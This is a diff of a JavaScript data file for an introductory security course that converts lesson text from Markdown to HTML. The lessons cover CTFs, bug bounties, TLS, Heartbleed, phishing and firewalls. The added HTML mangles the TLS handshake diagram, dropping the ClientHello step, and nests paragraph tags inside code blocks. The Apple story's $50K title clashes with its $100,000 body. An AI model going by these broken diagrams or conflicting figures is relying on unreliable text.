         titleEn: "Capture The Flag (CTF)",
-        contentEn: `**CTF** = a hacking competition where teams solve security challenges to find hidden "flags" (secret strings).
+        contentEn: `<p><strong>CTF</strong> = a hacking competition where teams solve security challenges to find hidden "flags" (secret strings).</p>
 
-**CTF types:**
-- **Jeopardy** — categories with challenges of different difficulty. Categories: Web, Crypto, Reverse Engineering, Forensics, Binary Exploitation (pwn)
-- **Attack-Defense** — each team has a server. Attack other teams while defending your own.
-- **King of the Hill** — capture and hold a server as long as possible.
+<p><strong>CTF types:</strong></p>
+<ul>
+<li><strong>Jeopardy</strong> — categories with challenges of different difficulty. Categories: Web, Crypto, Reverse Engineering, Forensics, Binary Exploitation (pwn)</li>
+<li><strong>Attack-Defense</strong> — each team has a server. Attack other teams while defending your own.</li>
+<li><strong>King of the Hill</strong> — capture and hold a server as long as possible.</li>
+</ul>
 
-**Example challenge (Web):**
-- You get a website with a login page
-- The hint says: "The admin left a note"
-- You check the HTML source → hidden comment: \`<!-- password: s3cur3 -->\`
-- Login with admin/s3cur3 → get the flag: \`FLAG{html_comments_are_not_secure}\`
+<p><strong>Example challenge (Web):</strong></p>
+<ul>
+<li>You get a website with a login page</li>
+<li>The hint says: "The admin left a note"</li>
+<li>You check the HTML source → hidden comment: <code><!-- password: s3cur3 --></code></li>
+<li>Login with admin/s3cur3 → get the flag: <code>FLAG{html_comments_are_not_secure}</code></li>
+</ul>
 
-**Skills you learn:**
-- Web exploitation (SQLi, XSS, SSRF)
-- Binary analysis and reverse engineering
-- Cryptography (break weak encryption)
-- Forensics (analyze pcap files, disk images, memory dumps)
+<p><strong>Skills you learn:</strong></p>
+<ul>
+<li>Web exploitation (SQLi, XSS, SSRF)</li>
+<li>Binary analysis and reverse engineering</li>
+<li>Cryptography (break weak encryption)</li>
+<li>Forensics (analyze pcap files, disk images, memory dumps)</li>
+</ul>
 
-**Where to practice:**
-- **PicoCTF** — beginner friendly (by Carnegie Mellon)
-- **HackTheBox** — virtual machines to hack
-- **TryHackMe** — guided learning paths
-- **OverTheWire** — Linux and networking challenges`
+<p><strong>Where to practice:</strong></p>
+<ul>
+<li><strong>PicoCTF</strong> — beginner friendly (by Carnegie Mellon)</li>
+<li><strong>HackTheBox</strong> — virtual machines to hack</li>
+<li><strong>TryHackMe</strong> — guided learning paths</li>
+<li><strong>OverTheWire</strong> — Linux and networking challenges</li>
+</ul>`
       },
       {
         titleEn: "Bug Bounty Programs",
-        contentEn: `**Bug Bounty** = companies pay hackers to find and report security vulnerabilities.
+        contentEn: `<p><strong>Bug Bounty</strong> = companies pay hackers to find and report security vulnerabilities.</p>
 
-**How it works:**
-1. Company publishes a program (scope, rules, rewards)
-2. Hackers find vulnerabilities and write reports
-3. Company verifies and pays based on severity
+<p><strong>How it works:</strong></p>
+<ol>
+<li>Company publishes a program (scope, rules, rewards)</li>
+<li>Hackers find vulnerabilities and write reports</li>
+<li>Company verifies and pays based on severity</li>
+</ol>
 
-**Severity and typical rewards:**
-- **Critical** (RCE, auth bypass) → $10,000 – $100,000+
-- **High** (SQLi, SSRF, privilege escalation) → $5,000 – $25,000
-- **Medium** (stored XSS, IDOR) → $1,000 – $5,000
-- **Low** (reflected XSS, info disclosure) → $100 – $1,000
+<p><strong>Severity and typical rewards:</strong></p>
+<ul>
+<li><strong>Critical</strong> (RCE, auth bypass) → $10,000 – $100,000+</li>
+<li><strong>High</strong> (SQLi, SSRF, privilege escalation) → $5,000 – $25,000</li>
+<li><strong>Medium</strong> (stored XSS, IDOR) → $1,000 – $5,000</li>
+<li><strong>Low</strong> (reflected XSS, info disclosure) → $100 – $1,000</li>
+</ul>
 
-**Major platforms:**
-- **HackerOne** — largest platform, $300M+ paid total
-- **Bugcrowd** — second largest, strong triage team
-- **Intigriti** — popular in Europe
+<p><strong>Major platforms:</strong></p>
+<ul>
+<li><strong>HackerOne</strong> — largest platform, $300M+ paid total</li>
+<li><strong>Bugcrowd</strong> — second largest, strong triage team</li>
+<li><strong>Intigriti</strong> — popular in Europe</li>
+</ul>
 
-**The industry in numbers:**
-- $1.5 billion+ paid to hackers total (all platforms)
-- Top hackers earn $500K+ per year
-- 30,000+ organizations run programs
-- Average time to first valid bug: 2-3 months for beginners
+<p><strong>The industry in numbers:</strong></p>
+<ul>
+<li>$1.5 billion+ paid to hackers total (all platforms)</li>
+<li>Top hackers earn $500K+ per year</li>
+<li>30,000+ organizations run programs</li>
+<li>Average time to first valid bug: 2-3 months for beginners</li>
+</ul>
 
-**Tips for beginners:**
-- Start with programs that have a wide scope
-- Focus on one vulnerability type (e.g., IDOR)
-- Read disclosed reports on HackerOne to learn
-- Write clear reports with steps to reproduce`
+<p><strong>Tips for beginners:</strong></p>
+<ul>
+<li>Start with programs that have a wide scope</li>
+<li>Focus on one vulnerability type (e.g., IDOR)</li>
+<li>Read disclosed reports on HackerOne to learn</li>
+<li>Write clear reports with steps to reproduce</li>
+</ul>`
       },
       {
         titleEn: "Story: Apple's $50K Bounty",
-        contentEn: `In 2020, a security researcher found a critical vulnerability in **Apple's Sign In** system.
+        contentEn: `<p>In 2020, a security researcher found a critical vulnerability in <strong>Apple's Sign In</strong> system.</p>
 
-**The bug:**
-- "Sign in with Apple" lets you log into apps using your Apple ID
-- The researcher found he could request a token for **any Apple ID email**
-- With this token, he could log into any app that uses "Sign in with Apple" — as any user
+<p><strong>The bug:</strong></p>
+<ul>
+<li>"Sign in with Apple" lets you log into apps using your Apple ID</li>
+<li>The researcher found he could request a token for <strong>any Apple ID email</strong></li>
+<li>With this token, he could log into any app that uses "Sign in with Apple" — as any user</li>
+</ul>
 
-**Impact:**
-- Full account takeover on any app using Apple Sign In
-- Affected millions of users on thousands of apps
-- No user interaction needed — completely silent attack
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Full account takeover on any app using Apple Sign In</li>
+<li>Affected millions of users on thousands of apps</li>
+<li>No user interaction needed — completely silent attack</li>
+</ul>
 
-**How he reported it:**
-1. Found the bug and tested on his own accounts
-2. Wrote a detailed report with proof-of-concept
-3. Submitted to Apple's Bug Bounty program
-4. Apple confirmed and fixed the bug within days
+<p><strong>How he reported it:</strong></p>
+<ol>
+<li>Found the bug and tested on his own accounts</li>
+<li>Wrote a detailed report with proof-of-concept</li>
+<li>Submitted to Apple's Bug Bounty program</li>
+<li>Apple confirmed and fixed the bug within days</li>
+</ol>
 
-**Reward: $100,000** (Apple's highest bounty category)
+<p><strong>Reward: $100,000</strong> (Apple's highest bounty category)</p>
 
-**Why this story matters:**
-- One person, one bug, huge impact
-- Responsible disclosure protected millions of users
-- The researcher earned $100K legally — and built his reputation
-- Without bug bounties, this bug might have been sold on the dark web or exploited silently
+<p><strong>Why this story matters:</strong></p>
+<ul>
+<li>One person, one bug, huge impact</li>
+<li>Responsible disclosure protected millions of users</li>
+<li>The researcher earned $100K legally — and built his reputation</li>
+<li>Without bug bounties, this bug might have been sold on the dark web or exploited silently</li>
+</ul>
 
-**The alternative:** On the black market, this bug could sell for $500K+. Bug bounties give hackers a legal and ethical path.`
+<p><strong>The alternative:</strong> On the black market, this bug could sell for $500K+. Bug bounties give hackers a legal and ethical path.</p>`
       }
     ]
   },
@@ -4608,123 +4724,152 @@ Your browser sends the request with your session cookie. The bank thinks it's yo
     pages: [
       {
         titleEn: "Symmetric vs Asymmetric Encryption",
-        contentEn: `**Encryption** = turning readable data (plaintext) into unreadable data (ciphertext). Only someone with the key can read it.
+        contentEn: `<p><strong>Encryption</strong> = turning readable data (plaintext) into unreadable data (ciphertext). Only someone with the key can read it.</p>
 
-**Symmetric encryption** — same key to encrypt and decrypt:
-- Fast, efficient for large data
-- Problem: how do you share the key securely?
-- Algorithms: **AES** (standard, 128/256 bit), DES (old, broken), ChaCha20
+<p><strong>Symmetric encryption</strong> — same key to encrypt and decrypt:</p>
+<ul>
+<li>Fast, efficient for large data</li>
+<li>Problem: how do you share the key securely?</li>
+<li>Algorithms: <strong>AES</strong> (standard, 128/256 bit), DES (old, broken), ChaCha20</li>
+</ul>
 
-**Example:**
-\`\`\`
-Plaintext: "Hello" + Key: "s3cr3t" → Ciphertext: "x7#kQ..."
-Ciphertext: "x7#kQ..." + Key: "s3cr3t" → Plaintext: "Hello"
-\`\`\`
+<p><strong>Example:</strong></p>
+<pre><code>Plaintext: "Hello" + Key: "s3cr3t" → Ciphertext: "x7#kQ..."
+<p>Ciphertext: "x7#kQ..." + Key: "s3cr3t" → Plaintext: "Hello"</p>
+</code></pre>
 
-**Asymmetric encryption** — two keys: public key + private key:
-- Public key encrypts → only private key can decrypt
-- Slow, used for small data (keys, signatures)
-- Algorithms: **RSA** (2048/4096 bit), **ECC** (smaller keys, same security)
+<p><strong>Asymmetric encryption</strong> — two keys: public key + private key:</p>
+<ul>
+<li>Public key encrypts → only private key can decrypt</li>
+<li>Slow, used for small data (keys, signatures)</li>
+<li>Algorithms: <strong>RSA</strong> (2048/4096 bit), <strong>ECC</strong> (smaller keys, same security)</li>
+</ul>
 
-**Example:**
-\`\`\`
-Alice wants to send Bob a message:
-1. Bob shares his PUBLIC key with Alice
-2. Alice encrypts with Bob's public key
-3. Only Bob's PRIVATE key can decrypt
-\`\`\`
+<p><strong>Example:</strong></p>
+<pre><code>Alice wants to send Bob a message:
+<ol>
+<li>Bob shares his PUBLIC key with Alice</li>
+<li>Alice encrypts with Bob's public key</li>
+<li>Only Bob's PRIVATE key can decrypt</li>
+</ol>
+</code></pre>
 
-**In practice:** Both are used together. Asymmetric encrypts a symmetric key. Then symmetric encrypts the data. This is called a **hybrid system**.`
+<p><strong>In practice:</strong> Both are used together. Asymmetric encrypts a symmetric key. Then symmetric encrypts the data. This is called a <strong>hybrid system</strong>.</p>`
       },
       {
         titleEn: "The TLS Handshake",
-        contentEn: `**TLS** (Transport Layer Security) protects data between your browser and the server. The padlock icon in your browser = TLS is active.
+        contentEn: `<p><strong>TLS</strong> (Transport Layer Security) protects data between your browser and the server. The padlock icon in your browser = TLS is active.</p>
 
-**TLS Handshake steps:**
+<p><strong>TLS Handshake steps:</strong></p>
 
-\`\`\`
-Browser                          Server
-   |                                |
-   |--- 1. ClientHello ----------->|  (supported ciphers, TLS version)
-   |                                |
-   |<-- 2. ServerHello ------------|  (chosen cipher, server certificate)
-   |                                |
-   |    3. Browser verifies        |  (is certificate valid? trusted CA?)
-   |       server certificate      |
-   |                                |
-   |--- 4. Key Exchange ---------->|  (both sides compute shared secret)
-   |                                |
-   |<== 5. Encrypted tunnel ======>|  (all data encrypted with shared key)
-\`\`\`
+<pre><code>Browser                          Server
+<table>
+<thead><tr></tr></thead>
+<tbody>
+<tr><td></td></tr>
+<tr><td><-- 2. ServerHello ------------</td><td>(chosen cipher, server certificate)</td></tr>
+<tr><td></td></tr>
+<tr><td>3. Browser verifies</td><td>(is certificate valid? trusted CA?)</td></tr>
+<tr><td>server certificate</td></tr>
+<tr><td></td></tr>
+<tr><td>--- 4. Key Exchange ----------></td><td>(both sides compute shared secret)</td></tr>
+<tr><td></td></tr>
+<tr><td><== 5. Encrypted tunnel ======></td><td>(all data encrypted with shared key)</td></tr>
+</tbody></table>
+</code></pre>
 
-**Key concepts:**
-- **Certificate** — proves the server is who it says it is (signed by a CA)
-- **CA (Certificate Authority)** — trusted organizations that issue certificates (Let's Encrypt, DigiCert)
-- **Cipher suite** — the combination of algorithms used (e.g., TLS_AES_256_GCM_SHA384)
+<p><strong>Key concepts:</strong></p>
+<ul>
+<li><strong>Certificate</strong> — proves the server is who it says it is (signed by a CA)</li>
+<li><strong>CA (Certificate Authority)</strong> — trusted organizations that issue certificates (Let's Encrypt, DigiCert)</li>
+<li><strong>Cipher suite</strong> — the combination of algorithms used (e.g., TLS_AES_256_GCM_SHA384)</li>
+</ul>
 
-**TLS versions:**
-- TLS 1.0, 1.1 — deprecated, insecure
-- **TLS 1.2** — still widely used, secure
-- **TLS 1.3** — latest, faster handshake (1 round trip instead of 2)`
+<p><strong>TLS versions:</strong></p>
+<ul>
+<li>TLS 1.0, 1.1 — deprecated, insecure</li>
+<li><strong>TLS 1.2</strong> — still widely used, secure</li>
+<li><strong>TLS 1.3</strong> — latest, faster handshake (1 round trip instead of 2)</li>
+</ul>`
       },
       {
         titleEn: "WhatsApp End-to-End Encryption",
-        contentEn: `**End-to-End Encryption (E2E)** = only the sender and receiver can read the messages. Not even the service provider (WhatsApp/Signal) can read them.
+        contentEn: `<p><strong>End-to-End Encryption (E2E)</strong> = only the sender and receiver can read the messages. Not even the service provider (WhatsApp/Signal) can read them.</p>
 
-**How WhatsApp E2E works (Signal Protocol):**
+<p><strong>How WhatsApp E2E works (Signal Protocol):</strong></p>
 
-1. **Key generation** — each phone creates a key pair (public + private)
-2. **Key exchange** — phones exchange public keys when you start a chat
-3. **Message encryption** — each message is encrypted with a unique key
-4. **Forward secrecy** — even if one key is stolen, past messages stay safe
+<ol>
+<li><strong>Key generation</strong> — each phone creates a key pair (public + private)</li>
+<li><strong>Key exchange</strong> — phones exchange public keys when you start a chat</li>
+<li><strong>Message encryption</strong> — each message is encrypted with a unique key</li>
+<li><strong>Forward secrecy</strong> — even if one key is stolen, past messages stay safe</li>
+</ol>
 
-**What WhatsApp CAN see:**
-- Who you talk to (metadata)
-- When you send messages (timestamps)
-- Your phone number and contacts
+<p><strong>What WhatsApp CAN see:</strong></p>
+<ul>
+<li>Who you talk to (metadata)</li>
+<li>When you send messages (timestamps)</li>
+<li>Your phone number and contacts</li>
+</ul>
 
-**What WhatsApp CANNOT see:**
-- Message content (text, photos, videos)
-- Voice and video call content
+<p><strong>What WhatsApp CANNOT see:</strong></p>
+<ul>
+<li>Message content (text, photos, videos)</li>
+<li>Voice and video call content</li>
+</ul>
 
-**Why metadata matters:**
-- "You called a suicide hotline at 2 AM for 45 minutes" — no content needed to learn a lot
-- Governments have requested metadata from WhatsApp
+<p><strong>Why metadata matters:</strong></p>
+<ul>
+<li>"You called a suicide hotline at 2 AM for 45 minutes" — no content needed to learn a lot</li>
+<li>Governments have requested metadata from WhatsApp</li>
+</ul>
 
-**Comparison:**
-- **WhatsApp** — E2E by default, closed source
-- **Signal** — E2E by default, open source, minimal metadata
-- **Telegram** — E2E only in "Secret Chats" (not default!)`
+<p><strong>Comparison:</strong></p>
+<ul>
+<li><strong>WhatsApp</strong> — E2E by default, closed source</li>
+<li><strong>Signal</strong> — E2E by default, open source, minimal metadata</li>
+<li><strong>Telegram</strong> — E2E only in "Secret Chats" (not default!)</li>
+</ul>`
       },
       {
         titleEn: "Story: The Heartbleed Bug",
-        contentEn: `In April 2014, researchers discovered **Heartbleed** — a bug in OpenSSL that affected **17% of all web servers**.
+        contentEn: `<p>In April 2014, researchers discovered <strong>Heartbleed</strong> — a bug in OpenSSL that affected <strong>17% of all web servers</strong>.</p>
 
-**What is OpenSSL?**
-- The most popular library for TLS/SSL encryption
-- Used by millions of websites, email servers, VPNs
+<p><strong>What is OpenSSL?</strong></p>
+<ul>
+<li>The most popular library for TLS/SSL encryption</li>
+<li>Used by millions of websites, email servers, VPNs</li>
+</ul>
 
-**The bug (CVE-2014-0160):**
-- TLS has a "heartbeat" feature — a keep-alive ping between client and server
-- Client sends: "Here is a 4-byte word: 'bird'. Send it back."
-- Server reads 4 bytes and sends back: "bird" ✓
+<p><strong>The bug (CVE-2014-0160):</strong></p>
+<ul>
+<li>TLS has a "heartbeat" feature — a keep-alive ping between client and server</li>
+<li>Client sends: "Here is a 4-byte word: 'bird'. Send it back."</li>
+<li>Server reads 4 bytes and sends back: "bird" ✓</li>
+</ul>
 
-**The exploit:**
-- Attacker sends: "Here is a 40,000-byte word: 'bird'. Send it back."
-- Server doesn't check the real length
-- Server reads 40,000 bytes from memory and sends them back
-- Those bytes contain: **private keys, passwords, session tokens**
+<p><strong>The exploit:</strong></p>
+<ul>
+<li>Attacker sends: "Here is a 40,000-byte word: 'bird'. Send it back."</li>
+<li>Server doesn't check the real length</li>
+<li>Server reads 40,000 bytes from memory and sends them back</li>
+<li>Those bytes contain: <strong>private keys, passwords, session tokens</strong></li>
+</ul>
 
-**Impact:**
-- Attacker could steal the server's **private SSL key**
-- With the key → decrypt all traffic (past and future)
-- No trace in server logs — completely invisible
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Attacker could steal the server's <strong>private SSL key</strong></li>
+<li>With the key → decrypt all traffic (past and future)</li>
+<li>No trace in server logs — completely invisible</li>
+</ul>
 
-**The fix:**
-- Add one line of code: check that the claimed length matches the actual length
-- The bug existed for **2 years** before discovery (introduced in 2012)
+<p><strong>The fix:</strong></p>
+<ul>
+<li>Add one line of code: check that the claimed length matches the actual length</li>
+<li>The bug existed for <strong>2 years</strong> before discovery (introduced in 2012)</li>
+</ul>
 
-**Lesson:** One small coding mistake in a critical library can break the security of half the internet.`
+<p><strong>Lesson:</strong> One small coding mistake in a critical library can break the security of half the internet.</p>`
       }
     ]
   },
@@ -4734,111 +4879,141 @@ Browser                          Server
     pages: [
       {
         titleEn: "Anatomy of a Phishing Attack",
-        contentEn: `**Phishing** = tricking people into giving up passwords, clicking malicious links, or downloading malware.
+        contentEn: `<p><strong>Phishing</strong> = tricking people into giving up passwords, clicking malicious links, or downloading malware.</p>
 
-**Phishing email red flags:**
-- Urgent language: "Your account will be closed in 24 hours!"
-- Generic greeting: "Dear Customer" (not your name)
-- Suspicious sender: support@amaz0n-security.com (not amazon.com)
-- Mismatched link: text says "amazon.com" but link goes to "amaz0n.evil.com"
-- Unexpected attachment: "Invoice_March.pdf.exe"
+<p><strong>Phishing email red flags:</strong></p>
+<ul>
+<li>Urgent language: "Your account will be closed in 24 hours!"</li>
+<li>Generic greeting: "Dear Customer" (not your name)</li>
+<li>Suspicious sender: support@amaz0n-security.com (not amazon.com)</li>
+<li>Mismatched link: text says "amazon.com" but link goes to "amaz0n.evil.com"</li>
+<li>Unexpected attachment: "Invoice_March.pdf.exe"</li>
+</ul>
 
-**Types of phishing:**
-- **Mass phishing** — same email to millions of people
-- **Spear phishing** — targeted at a specific person (uses personal details)
-- **Whaling** — spear phishing aimed at executives (CEO, CFO)
-- **Clone phishing** — copies a real email you received, replaces the attachment
+<p><strong>Types of phishing:</strong></p>
+<ul>
+<li><strong>Mass phishing</strong> — same email to millions of people</li>
+<li><strong>Spear phishing</strong> — targeted at a specific person (uses personal details)</li>
+<li><strong>Whaling</strong> — spear phishing aimed at executives (CEO, CFO)</li>
+<li><strong>Clone phishing</strong> — copies a real email you received, replaces the attachment</li>
+</ul>
 
-**How to check a suspicious email:**
-1. Hover over links — check the real URL before clicking
-2. Check the sender's actual email address (not just the display name)
-3. Look for spelling and grammar mistakes
-4. Ask yourself: "Did I expect this email?"
-5. When in doubt — go directly to the website (don't click the link)`
+<p><strong>How to check a suspicious email:</strong></p>
+<ol>
+<li>Hover over links — check the real URL before clicking</li>
+<li>Check the sender's actual email address (not just the display name)</li>
+<li>Look for spelling and grammar mistakes</li>
+<li>Ask yourself: "Did I expect this email?"</li>
+<li>When in doubt — go directly to the website (don't click the link)</li>
+</ol>`
       },
       {
         titleEn: "Vishing, Smishing & Pretexting",
-        contentEn: `**Vishing** (Voice Phishing) — attacks over the phone:
-- Caller pretends to be your bank, IT support, or government
-- Uses caller ID spoofing (shows a real bank number)
-- Creates urgency: "Suspicious transaction on your account right now!"
-- Goal: get your password, OTP code, or credit card number
+        contentEn: `<p><strong>Vishing</strong> (Voice Phishing) — attacks over the phone:</p>
+<ul>
+<li>Caller pretends to be your bank, IT support, or government</li>
+<li>Uses caller ID spoofing (shows a real bank number)</li>
+<li>Creates urgency: "Suspicious transaction on your account right now!"</li>
+<li>Goal: get your password, OTP code, or credit card number</li>
+</ul>
 
-**Smishing** (SMS Phishing) — attacks via text message:
-- "Your package is waiting. Track here: bit.ly/susp1c10us"
-- "Bank alert: unusual login. Verify: [link]"
-- Short links hide the real destination
-- Works because people trust SMS more than email
+<p><strong>Smishing</strong> (SMS Phishing) — attacks via text message:</p>
+<ul>
+<li>"Your package is waiting. Track here: bit.ly/susp1c10us"</li>
+<li>"Bank alert: unusual login. Verify: [link]"</li>
+<li>Short links hide the real destination</li>
+<li>Works because people trust SMS more than email</li>
+</ul>
 
-**Pretexting** — creating a fake scenario to build trust:
-- Attacker calls IT help desk: "Hi, I'm John from the marketing team. I forgot my password and I have a presentation in 10 minutes. Can you reset it?"
-- Attacker poses as a fire inspector to walk through the building
-- Uses authority, urgency, or sympathy to bypass security
+<p><strong>Pretexting</strong> — creating a fake scenario to build trust:</p>
+<ul>
+<li>Attacker calls IT help desk: "Hi, I'm John from the marketing team. I forgot my password and I have a presentation in 10 minutes. Can you reset it?"</li>
+<li>Attacker poses as a fire inspector to walk through the building</li>
+<li>Uses authority, urgency, or sympathy to bypass security</li>
+</ul>
 
-**Why social engineering works:**
-- Humans are the weakest link in security
-- People want to be helpful
-- Urgency bypasses critical thinking
-- Authority makes people comply without questioning`
+<p><strong>Why social engineering works:</strong></p>
+<ul>
+<li>Humans are the weakest link in security</li>
+<li>People want to be helpful</li>
+<li>Urgency bypasses critical thinking</li>
+<li>Authority makes people comply without questioning</li>
+</ul>`
       },
       {
         titleEn: "Story: The Twitter Hack (2020)",
-        contentEn: `On July 15, 2020, high-profile Twitter accounts were hijacked — including **Barack Obama, Elon Musk, Bill Gates, and Apple**.
+        contentEn: `<p>On July 15, 2020, high-profile Twitter accounts were hijacked — including <strong>Barack Obama, Elon Musk, Bill Gates, and Apple</strong>.</p>
 
-**The tweets:** "I'm giving back! Send $1,000 in Bitcoin and I'll send you $2,000 back." All tweets linked to the same Bitcoin wallet.
+<p><strong>The tweets:</strong> "I'm giving back! Send $1,000 in Bitcoin and I'll send you $2,000 back." All tweets linked to the same Bitcoin wallet.</p>
 
-**How it happened:**
-1. A 17-year-old from Florida called Twitter employees
-2. He pretended to be from Twitter's IT department
-3. He convinced employees to enter their credentials on a fake internal tool page (**vishing + phishing**)
-4. With employee access, he used Twitter's internal admin panel
-5. He took over 130 accounts, tweeted from 45 of them
+<p><strong>How it happened:</strong></p>
+<ol>
+<li>A 17-year-old from Florida called Twitter employees</li>
+<li>He pretended to be from Twitter's IT department</li>
+<li>He convinced employees to enter their credentials on a fake internal tool page (<strong>vishing + phishing</strong>)</li>
+<li>With employee access, he used Twitter's internal admin panel</li>
+<li>He took over 130 accounts, tweeted from 45 of them</li>
+</ol>
 
-**Result:**
-- $120,000 stolen in Bitcoin within hours
-- Twitter stock dropped 4%
-- Twitter had to disable tweeting for all verified accounts temporarily
+<p><strong>Result:</strong></p>
+<ul>
+<li>$120,000 stolen in Bitcoin within hours</li>
+<li>Twitter stock dropped 4%</li>
+<li>Twitter had to disable tweeting for all verified accounts temporarily</li>
+</ul>
 
-**The arrest:**
-- FBI tracked the Bitcoin transactions
-- The 17-year-old was arrested 2 weeks later
-- Sentenced to 3 years in juvenile detention
+<p><strong>The arrest:</strong></p>
+<ul>
+<li>FBI tracked the Bitcoin transactions</li>
+<li>The 17-year-old was arrested 2 weeks later</li>
+<li>Sentenced to 3 years in juvenile detention</li>
+</ul>
 
-**Lessons:**
-- Internal tools need strong access controls (MFA, audit logs)
-- Even big tech companies are vulnerable to social engineering
-- Security awareness training is essential for all employees
-- A teenager with no technical exploit — just social skills — took over Twitter`
+<p><strong>Lessons:</strong></p>
+<ul>
+<li>Internal tools need strong access controls (MFA, audit logs)</li>
+<li>Even big tech companies are vulnerable to social engineering</li>
+<li>Security awareness training is essential for all employees</li>
+<li>A teenager with no technical exploit — just social skills — took over Twitter</li>
+</ul>`
       },
       {
         titleEn: "Defense Against Social Engineering",
-        contentEn: `**For individuals:**
-- Enable **MFA** (Multi-Factor Authentication) everywhere
-- Use a **password manager** (unique passwords for every site)
-- Never share passwords, OTP codes, or personal info over phone/email
-- Verify requests through a different channel (call back on official number)
-- If it feels urgent — slow down and think
+        contentEn: `<p><strong>For individuals:</strong></p>
+<ul>
+<li>Enable <strong>MFA</strong> (Multi-Factor Authentication) everywhere</li>
+<li>Use a <strong>password manager</strong> (unique passwords for every site)</li>
+<li>Never share passwords, OTP codes, or personal info over phone/email</li>
+<li>Verify requests through a different channel (call back on official number)</li>
+<li>If it feels urgent — slow down and think</li>
+</ul>
 
-**For organizations:**
+<p><strong>For organizations:</strong></p>
 
-**Security Awareness Training:**
-- Regular phishing simulations (monthly)
-- Train employees to report suspicious emails (reward reporting)
-- Special training for high-risk roles (finance, HR, executives)
+<p><strong>Security Awareness Training:</strong></p>
+<ul>
+<li>Regular phishing simulations (monthly)</li>
+<li>Train employees to report suspicious emails (reward reporting)</li>
+<li>Special training for high-risk roles (finance, HR, executives)</li>
+</ul>
 
-**Technical controls:**
-- Email filtering and anti-phishing gateways
-- DMARC/SPF/DKIM — prevent email spoofing
-- MFA for all internal tools (especially admin panels)
-- Principle of least privilege — limit access to what's needed
+<p><strong>Technical controls:</strong></p>
+<ul>
+<li>Email filtering and anti-phishing gateways</li>
+<li>DMARC/SPF/DKIM — prevent email spoofing</li>
+<li>MFA for all internal tools (especially admin panels)</li>
+<li>Principle of least privilege — limit access to what's needed</li>
+</ul>
 
-**Processes:**
-- Verify identity before password resets (callback procedure)
-- Two-person approval for financial transfers over threshold
-- Visitor badges and escort policy for physical access
-- Incident reporting hotline (make it easy to report)
+<p><strong>Processes:</strong></p>
+<ul>
+<li>Verify identity before password resets (callback procedure)</li>
+<li>Two-person approval for financial transfers over threshold</li>
+<li>Visitor badges and escort policy for physical access</li>
+<li>Incident reporting hotline (make it easy to report)</li>
+</ul>
 
-**Key metric:** Click rate on phishing simulations. Good companies aim for <5%. Average is 20-30%.`
+<p><strong>Key metric:</strong> Click rate on phishing simulations. Good companies aim for <5%. Average is 20-30%.</p>`
       }
     ]
   },
@@ -4848,125 +5023,154 @@ Browser                          Server
     pages: [
       {
         titleEn: "Firewall Types",
-        contentEn: `**Firewall** = a security device that controls network traffic based on rules. It decides what goes in and what goes out.
+        contentEn: `<p><strong>Firewall</strong> = a security device that controls network traffic based on rules. It decides what goes in and what goes out.</p>
 
-**1. Stateless (Packet Filter)**
-- Checks each packet individually against simple rules
-- Rules based on: source IP, destination IP, port, protocol
-- Fast but dumb — doesn't understand connections
-- Example rule: "Block all traffic from IP 10.0.0.5 to port 22"
+<p><strong>1. Stateless (Packet Filter)</strong></p>
+<ul>
+<li>Checks each packet individually against simple rules</li>
+<li>Rules based on: source IP, destination IP, port, protocol</li>
+<li>Fast but dumb — doesn't understand connections</li>
+<li>Example rule: "Block all traffic from IP 10.0.0.5 to port 22"</li>
+</ul>
 
-**2. Stateful**
-- Tracks the **state** of connections (new, established, related)
-- If you start a connection outbound, it allows the response back in
-- Smarter — can detect packets that don't belong to a real connection
-- Most traditional firewalls are stateful
+<p><strong>2. Stateful</strong></p>
+<ul>
+<li>Tracks the <strong>state</strong> of connections (new, established, related)</li>
+<li>If you start a connection outbound, it allows the response back in</li>
+<li>Smarter — can detect packets that don't belong to a real connection</li>
+<li>Most traditional firewalls are stateful</li>
+</ul>
 
-**3. NGFW (Next-Generation Firewall)**
-- Everything stateful does, plus:
-- **Application awareness** — can identify apps (YouTube, Slack, BitTorrent) regardless of port
-- **IPS** (Intrusion Prevention) — blocks known attack patterns
-- **SSL inspection** — decrypts and inspects HTTPS traffic
-- **User identity** — rules based on user/group, not just IP
-- Examples: Palo Alto, Fortinet, Check Point
+<p><strong>3. NGFW (Next-Generation Firewall)</strong></p>
+<ul>
+<li>Everything stateful does, plus:</li>
+<li><strong>Application awareness</strong> — can identify apps (YouTube, Slack, BitTorrent) regardless of port</li>
+<li><strong>IPS</strong> (Intrusion Prevention) — blocks known attack patterns</li>
+<li><strong>SSL inspection</strong> — decrypts and inspects HTTPS traffic</li>
+<li><strong>User identity</strong> — rules based on user/group, not just IP</li>
+<li>Examples: Palo Alto, Fortinet, Check Point</li>
+</ul>
 
-**Where firewalls sit:**
-- Between internet and your network (perimeter)
-- Between network segments (internal)
-- On each computer (host-based: Windows Firewall, iptables)`
+<p><strong>Where firewalls sit:</strong></p>
+<ul>
+<li>Between internet and your network (perimeter)</li>
+<li>Between network segments (internal)</li>
+<li>On each computer (host-based: Windows Firewall, iptables)</li>
+</ul>`
       },
       {
         titleEn: "DMZ Architecture",
-        contentEn: `**DMZ** (Demilitarized Zone) = a network segment between the public internet and your private network.
+        contentEn: `<p><strong>DMZ</strong> (Demilitarized Zone) = a network segment between the public internet and your private network.</p>
 
-**Architecture diagram:**
+<p><strong>Architecture diagram:</strong></p>
 
-\`\`\`
-Internet
-    |
-[Outer Firewall]     ← allows HTTP/HTTPS from internet
-    |
-  [DMZ]              ← web servers, email servers, DNS
-    |
-[Inner Firewall]     ← strict rules, limited access
-    |
-[Internal Network]   ← databases, file servers, workstations
-\`\`\`
+<pre><code>Internet
+<p>|</p>
+<p>[Outer Firewall]     ← allows HTTP/HTTPS from internet</p>
+<p>|</p>
+<p>[DMZ]              ← web servers, email servers, DNS</p>
+<p>|</p>
+<p>[Inner Firewall]     ← strict rules, limited access</p>
+<p>|</p>
+<p>[Internal Network]   ← databases, file servers, workstations</p>
+</code></pre>
 
-**Rules:**
-- Internet → DMZ: allowed (specific ports only: 80, 443)
-- DMZ → Internal: very limited (e.g., web server → database on port 3306 only)
-- Internal → DMZ: allowed (for management)
-- Internet → Internal: **blocked** (never direct access)
+<p><strong>Rules:</strong></p>
+<ul>
+<li>Internet → DMZ: allowed (specific ports only: 80, 443)</li>
+<li>DMZ → Internal: very limited (e.g., web server → database on port 3306 only)</li>
+<li>Internal → DMZ: allowed (for management)</li>
+<li>Internet → Internal: <strong>blocked</strong> (never direct access)</li>
+</ul>
 
-**What goes in the DMZ:**
-- Web servers (public-facing)
-- Email servers (MX records)
-- DNS servers (public)
-- VPN gateways
